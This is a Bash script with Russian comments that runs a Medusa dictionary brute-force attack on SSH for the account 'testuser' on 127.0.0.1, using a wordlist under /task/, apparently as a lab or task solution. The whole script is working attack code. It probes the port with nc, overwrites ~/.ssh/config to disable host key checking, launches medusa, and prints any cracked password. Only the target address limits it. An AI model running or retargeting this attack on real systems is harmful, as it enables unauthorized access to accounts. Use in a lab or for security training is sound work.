#!/bin/bash

echo "========================================="
echo "  Брутфорс SSH с Medusa"
echo "========================================="
echo ""

# Цвета
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Параметры атаки
TARGET="127.0.0.1"
USERNAME="testuser"
WORDLIST="/task/wordlist.txt"
# WORDLIST="/usr/share/wordlists/rockyou.txt"
THREADS=1

echo -e "${YELLOW}[*] Цель: $TARGET${NC}"
echo -e "${YELLOW}[*] Пользователь: $USERNAME${NC}"
echo -e "${YELLOW}[*] Словарь: $WORDLIST${NC}"
echo -e "${YELLOW}[*] Потоки: $THREADS${NC}"
echo ""

# Проверка наличия Medusa
if ! command -v medusa &> /dev/null; then
    echo -e "${RED}[!] Medusa не найдена!${NC}"
    exit 1
fi

# Проверка наличия словаря
if [ ! -f "$WORDLIST" ]; then
    echo -e "${RED}[!] Словарь $WORDLIST не найден!${NC}"
    exit 1
fi

# Настройка SSH клиента для игнорирования проверки ключа
mkdir -p ~/.ssh
echo "StrictHostKeyChecking no" > ~/.ssh/config
echo "UserKnownHostsFile=/dev/null" >> ~/.ssh/config
chmod 600 ~/.ssh/config

# Ждем полной готовности SSH сервера
echo -e "${YELLOW}[*] Ожидание готовности SSH сервера...${NC}"
sleep 5

# Проверка доступности SSH
echo -e "${YELLOW}[*] Проверка доступности SSH порта...${NC}"
if ! nc -z 127.0.0.1 22 2>/dev/null; then
    echo -e "${RED}[!] SSH порт недоступен!${NC}"
    # Попробуем еще раз после дополнительной задержки
    sleep 3
fi

echo -e "${GREEN}[+] SSH сервер готов к приему подключений${NC}"
echo ""

# Запуск Medusa
echo -e "${YELLOW}[*] Запуск Medusa...${NC}"
echo -e "${YELLOW}[*] Это может занять некоторое время...${NC}"
echo ""

medusa -h $TARGET -u $USERNAME -P $WORDLIST -M ssh -t $THREADS -f -O medusa_output.txt

# Показываем результат
echo ""
if [ -f medusa_output.txt ]; then
    echo -e "${YELLOW}[*] Результаты атаки:${NC}"
    cat medusa_output.txt
    echo ""

    # Проверяем, найден ли пароль
    if grep -q "SUCCESS" medusa_output.txt; then
        echo -e "${GREEN}=========================================${NC}"
        echo -e "${GREEN}  Пароль найден!${NC}"
        echo -e "${GREEN}=========================================${NC}"
        echo ""
        grep "SUCCESS" medusa_output.txt
        exit 0
    fi
fi

echo -e "${RED}[!] Пароль не найден. Попробуйте другой словарь или метод.${NC}"
exit 1
